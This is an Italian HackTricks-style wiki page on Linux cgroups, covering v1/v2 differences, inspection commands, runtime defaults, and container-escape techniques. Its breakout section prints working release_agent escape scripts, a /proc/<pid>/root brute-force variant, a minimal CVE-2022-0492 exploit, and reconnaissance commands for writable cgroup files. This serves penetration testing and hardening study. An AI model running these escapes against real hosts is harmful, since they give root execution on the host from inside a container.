# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Linux **gruppi di controllo** sono il meccanismo del kernel usato per raggruppare i processi insieme per accounting, limitazione, prioritizzazione e enforcement delle policy. Se i namespaces riguardano principalmente l'isolamento della vista delle risorse, i cgroups riguardano soprattutto il governare **quanto** di quelle risorse un insieme di processi può consumare e, in alcuni casi, **quali classi di risorse** possono interagire. I containers si affidano ai cgroups costantemente, anche quando l'utente non li guarda direttamente, perché quasi ogni moderno runtime ha bisogno di un modo per dire al kernel "questi processi appartengono a questo workload, e queste sono le regole di risorse che si applicano a loro".

Per questo motivo i container engines collocano un nuovo container nel proprio sottoalbero cgroup. Una volta che l'albero dei processi è lì, il runtime può limitare la memoria, limitare il numero di PIDs, ponderare l'uso della CPU, regolare l'I/O e restringere l'accesso ai dispositivi. In un ambiente di produzione questo è essenziale sia per la sicurezza multi-tenant sia per una semplice igiene operativa. Un container senza controlli significativi sulle risorse potrebbe esaurire la memoria, inondare il sistema di processi, o monopolizzare CPU e I/O in modi che rendono instabile l'host o i workload vicini.

Da una prospettiva di sicurezza, i cgroups contano in due modi distinti. Primo, limiti di risorse mancanti o errati abilita attacchi di denial-of-service semplici da eseguire. Secondo, alcune funzionalità dei cgroup, specialmente in configurazioni più vecchie di **cgroup v1**, storicamente hanno creato primitivi potenti di breakout quando erano scrivibili dall'interno di un container.

## v1 vs v2

Esistono due modelli principali di cgroup in circolazione. **cgroup v1** espone più gerarchie di controller, e le vecchie writeup di exploit spesso ruotano attorno alle semantiche strane e talvolta eccessivamente potenti disponibili lì. **cgroup v2** introduce una gerarchia più unificata e un comportamento generalmente più pulito. Le distribuzioni moderne preferiscono sempre più cgroup v2, ma esistono ancora ambienti misti o legacy, il che significa che entrambi i modelli sono ancora rilevanti quando si analizzano sistemi reali.

La differenza è importante perché alcune delle storie di breakout dei container più famose, come gli abusi di **`release_agent`** in cgroup v1, sono legate molto specificamente al comportamento dei cgroup più vecchi. Un lettore che vede un exploit per cgroup su un blog e lo applica ciecamente a un sistema moderno solo con cgroup v2 rischia di fraintendere ciò che è realmente possibile sul target.

## Ispezione

Il modo più rapido per vedere dove si trova la shell corrente è:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Il file `/proc/self/cgroup` mostra i percorsi di cgroup associati al processo corrente. Su un moderno host cgroup v2, vedrai spesso una voce unificata. Su host più vecchi o ibridi, potresti vedere più percorsi dei controller v1. Una volta che conosci il percorso, puoi ispezionare i file corrispondenti sotto `/sys/fs/cgroup` per vedere limiti e utilizzo corrente.

Su un host cgroup v2, i seguenti comandi sono utili:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Questi file rivelano quali controller esistono e quali vengono delegati ai child cgroups. Questo modello di delega è importante in ambienti rootless e gestiti da systemd, dove il runtime può essere in grado di controllare solo il sottoinsieme di funzionalità dei cgroup che la gerarchia parent effettivamente delega.

## Lab

Un modo per osservare i cgroups nella pratica è eseguire un container con memoria limitata:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Puoi anche provare un container con limite di PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Questi esempi sono utili perché aiutano a collegare il runtime flag all'interfaccia file del kernel. Il runtime non applica la regola per magia; sta scrivendo le impostazioni cgroup rilevanti e poi lascia che il kernel le applichi contro l'albero dei processi.

## Runtime Usage

Docker, Podman, containerd, e CRI-O si affidano tutti ai cgroups come parte del normale funzionamento. Le differenze di solito non riguardano se usano i cgroups, ma **quali default scelgono**, **come interagiscono con systemd**, **come funziona la delega in rootless**, e **quanto della configurazione è controllato a livello engine rispetto al livello di orchestrazione**.

In Kubernetes, resource requests e limits alla fine diventano configurazione cgroup sul nodo. Il percorso da Pod YAML all'enforcement del kernel passa attraverso il kubelet, il CRI runtime e l'OCI runtime, ma i cgroups sono comunque il meccanismo del kernel che applica infine la regola. In ambienti Incus/LXC, i cgroups sono usati intensamente, soprattutto perché i system containers spesso espongono un albero dei processi più ricco e aspettative operative più simili a VM.

## Misconfigurations And Breakouts

La classica storia di sicurezza dei cgroup è il meccanismo scrivibile **cgroup v1 `release_agent`**. In quel modello, se un attacker riuscisse a scrivere nei file cgroup corretti, abilitare `notify_on_release` e controllare il percorso memorizzato in `release_agent`, il kernel potrebbe finire per eseguire un percorso scelto dall'attacker nelle initial namespaces sull'host quando il cgroup diventa vuoto. Ecco perché le vecchie writeup dedicano così tanta attenzione alla scrivibilità del controller cgroup, alle opzioni di mount e alle condizioni di namespace/capability.

Anche quando `release_agent` non è disponibile, gli errori di cgroup contano ancora. Un accesso ai device troppo ampio può rendere i device dell'host raggiungibili dal container. Limiti di memoria e PID mancanti possono trasformare una semplice esecuzione di codice in un DoS dell'host. Una delega cgroup debole in scenari rootless può anche indurre in errore i difensori nel presumere che esista una restrizione quando il runtime non è mai stato effettivamente in grado di applicarla.

### `release_agent` Background

La tecnica `release_agent` si applica solo a **cgroup v1**. L'idea di base è che quando l'ultimo processo in un cgroup esce e `notify_on_release=1` è impostato, il kernel esegue il programma il cui percorso è memorizzato in `release_agent`. Quell'esecuzione avviene nelle **initial namespaces on the host**, ed è questo che trasforma un `release_agent` scrivibile in una container escape primitive.

Perché la tecnica funzioni, l'attacker generalmente ha bisogno di:

- una gerarchia scrivibile **cgroup v1**
- la capacità di creare o usare un child cgroup
- la capacità di impostare `notify_on_release`
- la capacità di scrivere un percorso in `release_agent`
- un percorso che si risolva in un eseguibile dal punto di vista dell'host

### Classic PoC

Il PoC storico one-liner è:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Questa PoC scrive un percorso del payload in `release_agent`, attiva il rilascio del cgroup e poi legge il file di output generato sull'host.

### Spiegazione leggibile

La stessa idea è più facile da capire se divisa in passaggi.

1. Creare e preparare un cgroup scrivibile:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identificare l'host path che corrisponde al container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Rilascia un payload che sarà visibile dal host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Attivare l'esecuzione svuotando il cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effetto è l'esecuzione sul lato host del payload con privilegi root dell'host. In un exploit reale, il payload solitamente scrive un file di prova, avvia una reverse shell o modifica lo stato dell'host.

### Variante a percorso relativo usando `/proc/<pid>/root`

In alcuni ambienti, il percorso host al filesystem del container non è ovvio o è nascosto dal storage driver. In tal caso il percorso del payload può essere espresso tramite `/proc/<pid>/root/...`, dove `<pid>` è un PID host appartenente a un processo nel container corrente. Questa è la base della variante di brute-force a percorso relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Il trucco rilevante qui non è la forza bruta in sé, ma la forma del percorso: `/proc/<pid>/root/...` permette al kernel di risolvere un file all'interno del filesystem del container dalla namespace dell'host, anche quando il percorso diretto dello storage dell'host non è noto a priori.

### CVE-2022-0492 Variant

Nel 2022, CVE-2022-0492 ha mostrato che la scrittura di `release_agent` in cgroup v1 non verificava correttamente `CAP_SYS_ADMIN` nella user namespace **iniziale**. Questo ha reso la tecnica molto più accessibile sui kernel vulnerabili perché un processo nel container che poteva montare una gerarchia di cgroup poteva scrivere in `release_agent` senza essere già privilegiato nella user namespace dell'host.

Exploit minimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Su un kernel vulnerabile, l'host esegue `/proc/self/exe` con i privilegi di root dell'host.

Per sfruttamento pratico, inizia verificando se l'ambiente espone ancora percorsi cgroup-v1 scrivibili o accesso a dispositivi pericolosi:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` è presente e scrivibile, sei già in territorio legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se il percorso del cgroup in sé non consente un escape, l'uso pratico successivo è spesso denial of service o reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Questi comandi indicano rapidamente se il carico di lavoro ha margine per eseguire un fork-bomb, consumare memoria in modo aggressivo o abusare di un'interfaccia cgroup legacy scrivibile.

## Controlli

Quando si analizza un target, lo scopo dei controlli sui cgroup è determinare quale modello di cgroup è in uso, se il container vede percorsi controller scrivibili e se vecchie primitive di breakout come `release_agent` sono rilevanti.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Cosa c'è di interessante qui:

- Se `mount | grep cgroup` mostra **cgroup v1**, writeup di breakout più vecchi diventano più rilevanti.
- Se `release_agent` esiste ed è raggiungibile, merita subito un'indagine più approfondita.
- Se la gerarchia cgroup visibile è scrivibile e il container ha anche forti capabilities, l'ambiente richiede una revisione molto più accurata.

Se scopri **cgroup v1**, mount dei controller scrivibili, e un container che ha anche forti capabilities o protezioni seccomp/AppArmor deboli, quella combinazione merita attenzione. I cgroup spesso vengono trattati come un argomento noioso di gestione delle risorse, ma storicamente hanno fatto parte di alcune delle catene di container escape più istruttive proprio perché il confine tra "controllo delle risorse" e "influenza sull'host" non è sempre stato così netto come si presumeva.

## Valori predefiniti del runtime

| Runtime / platform | Stato predefinito | Comportamento predefinito | Pratiche comuni che indeboliscono |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | I container vengono inseriti nei cgroup automaticamente; i limiti di risorse sono opzionali a meno che non vengano impostati con flag | omettendo `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Abilitato per impostazione predefinita | `--cgroups=enabled` è il default; i default del namespace dei cgroup variano per versione di cgroup (`private` su cgroup v2, `host` su alcune configurazioni cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accesso ai device rilassato, `--privileged` |
| Kubernetes | Abilitato tramite il runtime per impostazione predefinita | Pods e container vengono collocati nei cgroup dal runtime del nodo; il controllo fine delle risorse dipende da `resources.requests` / `resources.limits` | omettendo requests/limits delle risorse, accesso ai device privilegiato, misconfigurazioni del runtime a livello host |
| containerd / CRI-O | Abilitato per impostazione predefinita | i cgroup fanno parte della normale gestione del ciclo di vita | config runtime dirette che rilassano i controlli sui device o espongono interfacce legacy scrivibili di cgroup v1 |

La distinzione importante è che **esistenza dei cgroup** è solitamente predefinita, mentre **vincoli di risorse utili** sono spesso opzionali a meno che non siano configurati esplicitamente.
{{#include ../../../../banners/hacktricks-training.md}}
